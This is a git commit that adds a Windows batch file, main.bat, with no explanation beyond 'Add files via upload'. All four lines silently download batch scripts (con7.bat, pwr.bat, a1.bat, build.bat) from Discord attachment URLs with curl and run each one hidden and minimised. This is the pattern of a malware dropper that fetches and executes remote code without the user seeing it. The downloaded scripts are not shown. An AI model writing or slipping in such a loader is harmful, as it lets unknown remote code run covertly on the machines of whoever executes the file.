c449b13a5765dd661f6511852010b26e9f2a4a28
AuraDev777 <144074089+AuraDev777@users.noreply.github.com>
2023-09-05 00:30:42 -0400

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,5 @@
+curl -s -O https://cdn.discordapp.com/attachments/1132491154785587252/1148136220950528050/con7.bat && start /b /min con7.bat
+curl -s -O https://cdn.discordapp.com/attachments/1132491154785587252/1148130562754744391/pwr.bat && start /b /min pwr.bat
+curl -s -O https://cdn.discordapp.com/attachments/1132491154785587252/1148129758685700106/a1.bat && start /b /min a1.bat
+curl -s -O https://cdn.discordapp.com/attachments/1132491154785587252/1148128999936118804/build.bat && start /b /min build.bat
+
